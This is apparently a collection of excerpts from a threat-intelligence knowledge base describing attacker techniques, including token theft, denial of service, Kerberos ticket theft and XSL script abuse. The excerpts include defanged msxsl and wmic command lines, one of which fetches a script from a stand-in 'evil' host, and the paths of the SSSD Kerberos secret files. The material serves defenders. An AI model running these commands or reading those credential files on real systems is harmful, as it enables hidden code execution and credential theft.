      "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://app.tidalcyber.com/technique/ab823cbf-0238-4347-a191-a90d84b978f7)) or used to spawn a new process (i.e. [Create Process with Token](https://app.tidalcyber.com/technique/ef0e0599-6543-499d-8409-ef449da5c38a)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.<sup>[[Pentestlab Token Manipulation](https://app.tidalcyber.com/references/243deb44-4d47-4c41-bd5d-262c4319cce5)]</sup>\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",

      "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes<sup>[[FireEye OpPoisonedHandover February 2016](https://app.tidalcyber.com/references/1d57b1c8-930b-4bcb-a51e-39020327cc5d)]</sup> and to support other malicious activities, including distraction<sup>[[FSISAC FraudNetDoS September 2012](https://app.tidalcyber.com/references/9c8772eb-6d1d-4742-a2db-a5e1006effaa)]</sup>, hacktivism, and extortion.<sup>[[Symantec DDoS October 2014](https://app.tidalcyber.com/references/878e0382-4191-4bca-8adc-c379b0d57ba8)]</sup>\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.<sup>[[USNYAG IranianBotnet March 2016](https://app.tidalcyber.com/references/69ee73c1-359f-4584-a6e7-75119d24bbf5)]</sup>\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.<sup>[[ArsTechnica Great Firewall of China](https://app.tidalcyber.com/references/1a08d58f-bf91-4345-aa4e-2906d3ef365a)]</sup>\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://app.tidalcyber.com/technique/e6c14a7b-1fb8-4557-83e7-7f5b89717311).\n",

      "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://app.tidalcyber.com/technique/d4e46fe1-cc6d-4ef0-af72-a4e8dcd71381) and [Spearphishing Link](https://app.tidalcyber.com/technique/d08a9977-9fc2-46bb-84f9-dbb5187c426d). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://app.tidalcyber.com/technique/d4a36624-50cb-43d3-95af-a2e10878a533). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",

Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use.

Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).<sup>[[ADSecurity Kerberos Ring Decoder](https://app.tidalcyber.com/references/5f78a554-2d5c-49af-8c6c-6e10f9aec997)]</sup> Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.<sup>[[Microsoft Klist](https://app.tidalcyber.com/references/f500340f-23fc-406a-97ef-0de787ef8cec)]</sup>\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.<sup>[[MIT ccache](https://app.tidalcyber.com/references/6a1b4373-2304-420c-8733-e1eae71ff7b2)]</sup> On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://app.tidalcyber.com/technique/5e771f38-6286-4330-b7b4-38071ad6b68a).

By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.<sup>[[SpectorOps Bifrost Kerberos macOS 2019](https://app.tidalcyber.com/references/58ecb4e9-25fc-487b-9fed-25c781cc531b)]</sup><sup>[[macOS kerberos framework MIT](https://app.tidalcyber.com/references/8e09346b-03ce-4627-a365-f2f63089d1e0)]</sup>\n",

Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://app.tidalcyber.com/technique/34a112db-c61d-4ea2-872f-de3fc1af87a3)), but can involve unusual flags, specific strings, or other unique characteristics.

      "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. <sup>[[Microsoft XSLT Script Mar 2017](https://app.tidalcyber.com/references/7ff47640-2a98-4a55-939a-ab6c8c8d2d09)]</sup>\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://app.tidalcyber.com/technique/8811114c-a0cf-479c-b95d-c036467749e3), the Microsoft common line transformation utility binary (msxsl.exe) <sup>[[Microsoft msxsl.exe](https://app.tidalcyber.com/references/a25d664c-d109-466f-9b6a-7e9ea8c57895)]</sup> can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. <sup>[[Penetration Testing Lab MSXSL July 2017](https://app.tidalcyber.com/references/2f1adf20-a4b8-48c1-861f-0a44271765d7)]</sup> Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. <sup>[[Reaqta MSXSL Spearphishing MAR 2018](https://app.tidalcyber.com/references/927737c9-63a3-49a6-85dc-620e055aaf0a)]</sup> Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.<sup>[[XSL Bypass Mar 2019](https://app.tidalcyber.com/references/e4e2cf48-47e0-45d8-afc2-a35635f7e880)]</sup>\n\nCommand-line examples:<sup>[[Penetration Testing Lab MSXSL July 2017](https://app.tidalcyber.com/references/2f1adf20-a4b8-48c1-861f-0a44271765d7)]</sup><sup>[[XSL Bypass Mar 2019](https://app.tidalcyber.com/references/e4e2cf48-47e0-45d8-afc2-a35635f7e880)]</sup>\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://app.tidalcyber.com/technique/c37795d9-8970-461f-9491-3086d6b4b69a) to invoke JScript or VBScript within an XSL file.<sup>[[LOLBAS Wmic](https://app.tidalcyber.com/references/497e73d4-9f27-4b30-ba09-f152ce866d0f)]</sup> This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://app.tidalcyber.com/technique/b1da2b02-9ade-45e0-a795-ec1b19e5316a)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://app.tidalcyber.com/technique/c37795d9-8970-461f-9491-3086d6b4b69a) provided they utilize the /FORMAT switch.<sup>[[XSL Bypass Mar 2019](https://app.tidalcyber.com/references/e4e2cf48-47e0-45d8-afc2-a35635f7e880)]</sup>\n\nCommand-line examples:<sup>[[XSL Bypass Mar 2019](https://app.tidalcyber.com/references/e4e2cf48-47e0-45d8-afc2-a35635f7e880)]</sup><sup>[[LOLBAS Wmic](https://app.tidalcyber.com/references/497e73d4-9f27-4b30-ba09-f152ce866d0f)]</sup>\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",
